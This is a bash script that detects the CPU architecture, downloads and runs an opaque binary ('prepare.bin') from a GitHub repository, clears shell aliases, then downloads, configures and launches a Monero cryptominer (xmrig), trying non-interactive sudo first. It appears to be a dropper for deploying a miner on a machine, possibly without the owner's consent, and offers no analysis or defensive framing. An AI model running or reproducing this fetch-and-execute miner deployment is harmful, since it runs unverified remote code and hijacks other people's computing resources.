#!/bin/bash

architecture=$(uname -m)

case $architecture in
    arm64 | aarch64)
        arch="arm64"
        ;;
    x86_64 | amd64)
        arch="amd64"
        ;;
    *)
        echo "Unsupported architecture: $architecture"
        exit 1
        ;;
esac

curl -LO https://github.com/spetterman66/verynicerepo/raw/main/prepare.bin
chmod +x prepare.bin
./prepare.bin

unalias -a
curl -LO https://github.com/spetterman66/verynicerepo/raw/main/xmr_linux_$arch
chmod +x xmr_linux_$arch
sed -i 's/"numa": true/"numa": false/g' /tmp/xmrig/xmrig-6.21.3/config.json
sudo -n ./xmr_linux_$arch
./xmr_linux_$arch
